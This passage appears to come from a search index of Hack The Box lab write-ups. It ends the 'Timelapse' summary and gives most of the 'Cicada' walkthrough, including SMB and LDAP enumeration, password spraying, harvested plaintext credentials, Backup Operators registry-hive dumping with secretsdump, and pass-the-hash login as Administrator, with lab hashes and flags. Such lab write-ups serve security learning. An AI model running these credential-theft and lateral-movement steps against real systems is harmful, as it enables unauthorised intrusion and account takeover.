<p></p>"},{"location":"ch3ckm8_HTB_Timelapse/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>"},{"location":"ch3ckm8_HTB_Timelapse/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; found multiple services to focus on, like <code>RPC</code>, <code>SMB</code>, <code>LDAP</code></li> <li>RPC enumeration \u2192 nothing useful</li> <li>LDAP enumeration \u2192 nothing useful</li> <li>SMB enumeration revealed <code>share</code> containing password protected zip file</li> </ol>"},{"location":"ch3ckm8_HTB_Timelapse/#foothold_1","title":"Foothold","text":"<ol> <li>cracking the password protected zip file revealed a <code>pfx</code> file</li> <li>cracking the <code>pfx</code> file revealed a password</li> <li>extracted information from the <code>pfx</code> using that password such as <code>key</code> and <code>certificate</code> for a user (legacyy)</li> <li>logged in winrm using the <code>key</code> and the <code>certificate</code></li> <li>grabbed user flag</li> </ol>"},{"location":"ch3ckm8_HTB_Timelapse/#privesc_1","title":"Privesc","text":"<ol> <li>Enumerated user\u2019s group membership, found nothing interesting</li> <li>Found plaintext creds in the powershell <code>history</code> for another user (svc_deploy)</li> <li>Logged in as this user (svc_deploy) </li> <li>Enumerated group membership of the user, member of LAPS Readers</li> <li>Leaked <code>LAPS</code> password</li> <li>Logged in as administrator via <code>LAPS</code> password</li> <li>grabbed root flag</li> </ol>"},{"location":"ch3ckm8_HTB_Timelapse/#sidenotes","title":"Sidenotes","text":"<p>To conclude, this was a valuable machine, featuring cracking zip and pfx file passwords and also extracting valuable information from pfx file like keys and certificates for the foothold. As for the privesc part, it involved reading the PowerShell history where plaintext creds for another user were found, a user that was later found that can read LAPS password, which was the way i logged in as Administrator.</p> <p></p>"},{"location":"ch3ckm8_HTB_cicada/","title":"Cicada","text":""},{"location":"ch3ckm8_HTB_cicada/#intro","title":"Intro","text":"<p>[[windows]] [[NotAssumedBreach]] [[PrivGroupAbuse]]</p> <p>Tags: #windows #NotAssumedBreach #PrivGroupAbuse</p> <ul> <li>rpcclient (RPC enumeration)</li> <li>nxc (LDAP, SMB enumeration, rid-brute-force, password spraying)</li> <li>reg.py (Remote registry manipulation tool\u00a0through the MSRPC Interface)</li> <li>secretsdump (dumping registry hives)</li> </ul>"},{"location":"ch3ckm8_HTB_cicada/#reconnaissance","title":"Reconnaissance","text":""},{"location":"ch3ckm8_HTB_cicada/#add-target-to-etchosts","title":"Add target to /etc/hosts","text":"<pre><code>sudo sh -c \"echo '10.129.180.83 cicada.htb' &gt;&gt; /etc/hosts\"\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#nmap-scan","title":"Nmap scan","text":"<pre><code>sudo nmap -sC -sV cicada.htb\n</code></pre> <pre><code>Starting Nmap 7.94SVN ( &lt;https://nmap.org&gt; ) at 2025-08-19 10:24 CDT\nNmap scan report for cicada.htb (10.129.180.83)\nHost is up (0.076s latency).\nNot shown: 989 filtered tcp ports (no-response)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-19 22:25:14Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:CICADA-DC.cicada.htb\n| Not valid before: 2024-08-22T20:24:16\n|_Not valid after:  2025-08-22T20:24:16\n|_ssl-date: TLS randomness does not represent time\nService Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: 6h59m59s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-08-19T22:25:59\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .\nNmap done: 1 IP address (1 host up) scanned in 103.34 seconds\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#rpc-enumeration","title":"RPC enumeration","text":""},{"location":"ch3ckm8_HTB_cicada/#anonymous","title":"Anonymous","text":"<pre><code>\u2514\u2500\u2500\u257c [\u2605]$ rpcclient -U \"\" -N cicada.htb\nrpcclient $&gt; enumdomains\nresult was NT_STATUS_ACCESS_DENIED\nrpcclient $&gt; enumdomusers\nresult was NT_STATUS_ACCESS_DENIED\n</code></pre> <p>was not successful</p>"},{"location":"ch3ckm8_HTB_cicada/#ldap-enumeration","title":"LDAP enumeration","text":"<pre><code>ldapsearch -LLL -x -H ldap://cicada.htb -s base namingcontexts\n</code></pre> <pre><code>dn:\nnamingcontexts: DC=cicada,DC=htb\nnamingcontexts: CN=Configuration,DC=cicada,DC=htb\nnamingcontexts: CN=Schema,CN=Configuration,DC=cicada,DC=htb\nnamingcontexts: DC=DomainDnsZones,DC=cicada,DC=htb\nnamingcontexts: DC=ForestDnsZones,DC=cicada,DC=htb\n</code></pre> <pre><code>ldapsearch -LLL -x -H ldap://cicada.htb -b \"DC=cicada,DC=htb\" \"objectclass=user\" | egrep -i ^samaccountname | awk -F ': ' '{print $2}' | tee users.txt\n</code></pre> <p>was not successful</p>"},{"location":"ch3ckm8_HTB_cicada/#smb-enumeration","title":"SMB enumeration","text":""},{"location":"ch3ckm8_HTB_cicada/#anonymous_1","title":"Anonymous","text":"<pre><code>    smbclient -N -L cicada.htb\n</code></pre> <pre><code>Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nDEV             Disk      \nHR              Disk      \nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nSYSVOL          Disk      Logon server share\n</code></pre> <p>or we could also run</p> <pre><code>nxc smb cicada.htb -u guest -p '' --shares\n</code></pre> <pre><code>SMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\guest: \nSMB         10.129.180.83   445    CICADA-DC        [*] Enumerated shares\nSMB         10.129.180.83   445    CICADA-DC        Share           Permissions     Remark\nSMB         10.129.180.83   445    CICADA-DC        -----           -----------     ------\nSMB         10.129.180.83   445    CICADA-DC        ADMIN$                          Remote Admin\nSMB         10.129.180.83   445    CICADA-DC        C$                              Default share\nSMB         10.129.180.83   445    CICADA-DC        DEV                             \nSMB         10.129.180.83   445    CICADA-DC        HR              READ            \nSMB         10.129.180.83   445    CICADA-DC        IPC$            READ            Remote IPC\nSMB         10.129.180.83   445    CICADA-DC        NETLOGON                        Logon server share \nSMB         10.129.180.83   445    CICADA-DC        SYSVOL                          Logon server share\n</code></pre> <p>Here, i see 2 shares as non default windows ones, the <code>DEV</code> and <code>HR</code>, lets navigate to them</p> <pre><code>smbclient //cicada.htb/DEV\n</code></pre> <p>no access here, lets try <code>HR</code> share:</p> <pre><code>smbclient //cicada.htb/HR\n\nsmb: \\&gt; ls\n  .                                   D        0  Thu Mar 14 07:29:09 2024\n  ..                                  D        0  Thu Mar 14 07:21:29 2024\n  Notice from HR.txt                  A     1266  Wed Aug 28 12:31:48 2024\n\nsmb: \\&gt; mget *\n</code></pre> <p>viewing the txt file, we are given a password:</p> <pre><code>Your default password is: Cicada$M6Corpb*@Lp#nZp!8\n</code></pre> <p>though the txt file mentions username mentioned above, no username was found inside. Since we have now username and we know this password is a valid one, we can perform password spraying</p>"},{"location":"ch3ckm8_HTB_cicada/#foothold","title":"Foothold","text":""},{"location":"ch3ckm8_HTB_cicada/#gather-valid-users-via-rid-brute-forcing","title":"Gather valid users (via rid-brute-forcing)","text":"<p>Perform rid brute forcing:</p> <pre><code>nxc smb cicada.htb -u guest -p '' --rid-brute\n</code></pre> <p>Place them on a txt for our next steps:</p> <pre><code>nxc smb cicada.htb -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\\' -f2 | cut -d' ' -f1 | tee users.txt\n</code></pre> <p>The valid users gathered are:</p> <pre><code>Administrator\nGuest\nkrbtgt\nCICADA-DC$\njohn.smoulder\nsarah.dantelia\nmichael.wrightson\ndavid.orelious\nemily.oscars\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#password-spraying","title":"Password spraying","text":"<pre><code>nxc smb cicada.htb-u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success\n</code></pre> <pre><code>SMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\Administrator:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\Guest:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE \nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\krbtgt:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE \nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\CICADA-DC$:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 \nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\nSMB         10.129.180.83   445    CICADA-DC        [-] cicada.htb\\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE\n</code></pre> <p>The password was correlated with <code>michael.wrightson</code> </p>"},{"location":"ch3ckm8_HTB_cicada/#checking-where-we-can-login-with-michaelwrightson-creds","title":"Checking where we can login with <code>michael.wrightson</code> creds","text":"<p>Since we now have valid creds, lets use my script to bulk check the services that we can connect to via win-rm: ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check</p> <pre><code>./auto_netexec_bulk_creds_checker.sh cicada.htb 'michael.wrightson' 'Cicada$M6Corpb*@Lp#nZp!8'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on cicada.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.180.83   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nWINRM       10.129.180.83   5985   CICADA-DC        [-] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8\n\n[*] Checking if smb port 445 is open on cicada.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 \n\n[*] Checking if ldap port 389 is open on cicada.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.180.83   389    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 \n\n[*] Checking if rdp port 3389 is open on cicada.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on cicada.htb...\n[-] Skipping wmi \u2014 port 135 is closed\n\n[*] Checking if nfs port 2049 is open on cicada.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on cicada.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on cicada.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on cicada.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on cicada.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>It appears that we can login towards <code>SMB</code> and <code>LDAP</code>.</p>"},{"location":"ch3ckm8_HTB_cicada/#smb-enumeration-as-michaelwrightson","title":"SMB enumeration as michael.wrightson","text":"<pre><code>nxc smb cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares\n</code></pre> <p>it seems that this user has the same access as the guest user (besides NETLOGON, SYSVOL which after inspection contained nothing valuable )</p> <pre><code>SMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 \nSMB         10.129.180.83   445    CICADA-DC        [*] Enumerated shares\nSMB         10.129.180.83   445    CICADA-DC        Share           Permissions     Remark\nSMB         10.129.180.83   445    CICADA-DC        -----           -----------     ------\nSMB         10.129.180.83   445    CICADA-DC        ADMIN$                          Remote Admin\nSMB         10.129.180.83   445    CICADA-DC        C$                              Default share\nSMB         10.129.180.83   445    CICADA-DC        DEV                             \nSMB         10.129.180.83   445    CICADA-DC        HR              READ            \nSMB         10.129.180.83   445    CICADA-DC        IPC$            READ            Remote IPC\nSMB         10.129.180.83   445    CICADA-DC        NETLOGON        READ            Logon server share \nSMB         10.129.180.83   445    CICADA-DC        SYSVOL          READ            Logon server share\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#ldap-enumeration-as-michaelwrightson","title":"LDAP enumeration as michael.wrightson","text":"<pre><code>nxc ldap cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users\n</code></pre> <p>Very interesting! some accounts have Description, and one of them contains a plaintext password inside for another user!</p> <pre><code>SMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.180.83   389    CICADA-DC        [+] cicada.htb\\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 \nLDAP        10.129.180.83   389    CICADA-DC        [*] Total records returned: 8\nLDAP        10.129.180.83   389    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                               \nLDAP        10.129.180.83   389    CICADA-DC        Administrator                 2024-08-26 20:08:03 1       Built-in account for administering the computer/domain      \nLDAP        10.129.180.83   389    CICADA-DC        Guest                         2024-08-28 17:26:56 1       Built-in account for guest access to the computer/domain    \nLDAP        10.129.180.83   389    CICADA-DC        krbtgt                        2024-03-14 11:14:10 1       Key Distribution Center Service Account                     \nLDAP        10.129.180.83   389    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 1                                                                   \nLDAP        10.129.180.83   389    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 1                                                                   \nLDAP        10.129.180.83   389    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0                                                                   \nLDAP        10.129.180.83   389    CICADA-DC        david.orelious                2024-03-14 12:17:29 1       Just in case I forget my password is aRt$Lp#7t*VQ!3         \nLDAP        10.129.180.83   389    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 1 \n</code></pre> <p>Creds obtained:</p> <pre><code>david.orelious\naRt$Lp#7t*VQ!3\n</code></pre> <p>Lets see where this user can login:</p>"},{"location":"ch3ckm8_HTB_cicada/#checking-where-we-can-login-with-michaelwrightson-creds_1","title":"Checking where we can login with <code>michael.wrightson</code> creds","text":"<pre><code>./auto_netexec_bulk_creds_checker.sh cicada.htb 'david.orelious' 'aRt$Lp#7t*VQ!3'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on cicada.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.180.83   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nWINRM       10.129.180.83   5985   CICADA-DC        [-] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3\n\n[*] Checking if smb port 445 is open on cicada.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3 \n\n[*] Checking if ldap port 389 is open on cicada.htb...\n[+] Port 389 open \u2014 checking ldap with netexec\nSMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nLDAP        10.129.180.83   389    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3 \n\n[*] Checking if rdp port 3389 is open on cicada.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on cicada.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.180.83   135    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nRPC         10.129.180.83   135    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3 \n\n[*] Checking if nfs port 2049 is open on cicada.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on cicada.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on cicada.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on cicada.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on cicada.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>This user has access to <code>SMB</code> , <code>LDAP</code> , <code>RPC</code> , lets enumerate more:</p>"},{"location":"ch3ckm8_HTB_cicada/#smb-enumeration-as-davidorelious","title":"SMB enumeration as david.orelious","text":"<pre><code>nxc smb cicada.htb -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares\n</code></pre> <p>hm this user can read the <code>DEV</code> share which we previously could not read:</p> <pre><code>SMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\david.orelious:aRt$Lp#7t*VQ!3 \nSMB         10.129.180.83   445    CICADA-DC        [*] Enumerated shares\nSMB         10.129.180.83   445    CICADA-DC        Share           Permissions     Remark\nSMB         10.129.180.83   445    CICADA-DC        -----           -----------     ------\nSMB         10.129.180.83   445    CICADA-DC        ADMIN$                          Remote Admin\nSMB         10.129.180.83   445    CICADA-DC        C$                              Default share\nSMB         10.129.180.83   445    CICADA-DC        DEV             READ            \nSMB         10.129.180.83   445    CICADA-DC        HR              READ            \nSMB         10.129.180.83   445    CICADA-DC        IPC$            READ            Remote IPC\nSMB         10.129.180.83   445    CICADA-DC        NETLOGON        READ            Logon server share \nSMB         10.129.180.83   445    CICADA-DC        SYSVOL          READ            Logon server share\n</code></pre> <p>Lets navigate to the <code>DEV</code> share via smvclient:</p> <pre><code>smbclient -U david.orelious //cicada.htb/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'\n</code></pre> <p>it has a powershell script inside, lets download and inspect it</p> <pre><code>smb: \\&gt; ls\n  .                                   D        0  Thu Mar 14 07:31:39 2024\n  ..                                  D        0  Thu Mar 14 07:21:29 2024\n  Backup_script.ps1                   A      601  Wed Aug 28 12:28:22 2024\n\n        4168447 blocks of size 4096. 476884 blocks available\nsmb: \\&gt; get \"Backup_script.ps1\"\ngetting file \\Backup_script.ps1 of size 601 as Backup_script.ps1 (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)\n</code></pre> <p><code>Backup_script.ps1</code>:</p> <pre><code>$sourceDirectory = \"C:\\smb\"\n$destinationDirectory = \"D:\\Backup\"\n\n$username = \"emily.oscars\"\n$password = ConvertTo-SecureString \"Q!3@Lp#M6b*7t*Vt\" -AsPlainText -Force\n$credentials = New-Object System.Management.Automation.PSCredential($username, $password)\n$dateStamp = Get-Date -Format \"yyyyMMdd_HHmmss\"\n$backupFileName = \"smb_backup_$dateStamp.zip\"\n$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName\nCompress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath\nWrite-Host \"Backup completed successfully. Backup file saved to: $backupFilePath\"\n</code></pre> <p>perfect! we found creds for another user! creds obtained:</p> <pre><code>emily.oscars\nQ!3@Lp#M6b*7t*Vt\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#checking-where-we-can-login-with-those-creds","title":"Checking where we can login with those creds","text":"<pre><code>./auto_netexec_bulk_creds_checker.sh cicada.htb 'emily.oscars' 'Q!3@Lp#M6b*7t*Vt'\n</code></pre> <pre><code>[*] Checking if winrm port 5985 is open on cicada.htb...\n[+] Port 5985 open \u2014 checking winrm with netexec\nWINRM       10.129.180.83   5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nWINRM       10.129.180.83   5985   CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)\n\n[*] Checking if smb port 445 is open on cicada.htb...\n[+] Port 445 open \u2014 checking smb with netexec\nSMB         10.129.180.83   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)\nSMB         10.129.180.83   445    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt \n\n[*] Checking if ldap port 389 is open on cicada.htb...\n[-] Skipping ldap \u2014 port 389 is closed\n\n[*] Checking if rdp port 3389 is open on cicada.htb...\n[-] Skipping rdp \u2014 port 3389 is closed\n\n[*] Checking if wmi port 135 is open on cicada.htb...\n[+] Port 135 open \u2014 checking wmi with netexec\nRPC         10.129.180.83   135    CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)\nRPC         10.129.180.83   135    CICADA-DC        [+] cicada.htb\\emily.oscars:Q!3@Lp#M6b*7t*Vt \n\n[*] Checking if nfs port 2049 is open on cicada.htb...\n[-] Skipping nfs \u2014 port 2049 is closed\n\n[*] Checking if ssh port 22 is open on cicada.htb...\n[-] Skipping ssh \u2014 port 22 is closed\n\n[*] Checking if vnc port 5900 is open on cicada.htb...\n[-] Skipping vnc \u2014 port 5900 is closed\n\n[*] Checking if ftp port 21 is open on cicada.htb...\n[-] Skipping ftp \u2014 port 21 is closed\n\n[*] Checking if mssql port 1433 is open on cicada.htb...\n[-] Skipping mssql \u2014 port 1433 is closed\n</code></pre> <p>nice, we can login to <code>winrm</code> with this user, lets login</p>"},{"location":"ch3ckm8_HTB_cicada/#logging-in-as-emilyoscars","title":"Logging in as emily.oscars","text":"<pre><code>evil-winrm -i cicada.htb -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'\n</code></pre> <p>grabbed user flag: <code>f714f5fe3dc9c0cf4aae2d0cacaf9e03</code></p> <p>proof: </p> <p></p>"},{"location":"ch3ckm8_HTB_cicada/#privesc","title":"Privesc","text":""},{"location":"ch3ckm8_HTB_cicada/#group-membership","title":"Group membership","text":"<p>We could launch Bloodhound, but lets inspect group membership from the inside first:</p> <pre><code>net user emily.oscars\n</code></pre> <pre><code>User name                    emily.oscars\nFull Name                    Emily Oscars\nComment\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            8/22/2024 2:20:17 PM\nPassword expires             Never\nPassword changeable          8/23/2024 2:20:17 PM\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   8/19/2025 5:49:08 PM\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Backup Operators     *Remote Management Use\nGlobal Group memberships     *Domain Users\nThe command completed successfully.\n</code></pre> <p>Interesting, this user is memberof <code>Backup Operators</code> , lets find a way to abuse that </p>"},{"location":"ch3ckm8_HTB_cicada/#abusing-backup-operators-privileges","title":"Abusing Backup Operator\u2019s privileges","text":""},{"location":"ch3ckm8_HTB_cicada/#writing-registry-hives-to-temp-folder","title":"Writing registry hives to temp folder","text":"<p>Online i found multiple ways to do this, i preferred the following way:</p> <pre><code>reg.py emily.oscars:'Q!3@Lp#M6b*7t*Vt'@cicada.htb backup -o 'C:\\windows\\temp\\'\n</code></pre> <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...\n[*] Saved HKLM\\SAM to C:\\windows\\temp\\\\SAM.save\n[*] Saved HKLM\\SYSTEM to C:\\windows\\temp\\\\SYSTEM.save\n[*] Saved HKLM\\SECURITY to C:\\windows\\temp\\\\SECURITY.save\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#download-registry-hives-locally","title":"Download registry hives locally","text":"<p>Then navigate to the temp folder on winrm and download the 3 registry hives above:</p> <pre><code>*Evil-WinRM* PS C:\\windows\\temp&gt; download SAM.save\nInfo: Downloading C:\\windows\\temp\\SAM.save to SAM.save               \nInfo: Download successful!\n\n*Evil-WinRM* PS C:\\windows\\temp&gt; download SYSTEM.save\nInfo: Downloading C:\\windows\\temp\\SYSTEM.save to SYSTEM.save           \nInfo: Download successful!\n\n*Evil-WinRM* PS C:\\windows\\temp&gt; download SECURITY.save\nInfo: Downloading C:\\windows\\temp\\SECURITY.save to SECURITY.save       \nInfo: Download successful!\n</code></pre>"},{"location":"ch3ckm8_HTB_cicada/#dumping-the-registry-hives","title":"Dumping the registry hives","text":"<p>No we can dump those hives locally</p> <pre><code>secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL\n</code></pre> <pre><code>Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620\n[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n[*] Cleaning up... \n</code></pre> <p>almost done, Administrator\u2019s hash was found this way, lets login now</p>"},{"location":"ch3ckm8_HTB_cicada/#logging-in-as-administrator-via-pass-the-hash","title":"Logging in as Administrator via pass the hash","text":"<pre><code>evil-winrm -i cicada.htb -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'\n</code></pre> <p>grabbed root flag: <code>129cafa76c0b2261dd4c88a55b46138a</code></p> <p>proof:</p> <p></p>"},{"location":"ch3ckm8_HTB_cicada/#summary","title":"Summary","text":"<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading:</p>"},{"location":"ch3ckm8_HTB_cicada/#reconnaissance_1","title":"Reconnaissance","text":"<ol> <li>nmap scan -&gt; found multiple services to focus on, like <code>RPC</code>, <code>SMB</code>, <code>LDAP</code></li> <li>RPC enumeration \u2192 nothing useful</li> <li>SMB enumeration revealed <code>share</code> containing a txt file, containing password without username</li> </ol>"},{"location":"ch3ckm8_HTB_cicada/#foothold_1","title":"Foothold","text":"<ol> <li>Password spraying was performed, since we did not know which username corresponds to it, it was successful and the related user was found (michael.wrightson)</li> <li>Correlated user creds with <code>SMB</code> and <code>LDAP</code> services</li> <li>SMB enumeration \u2192 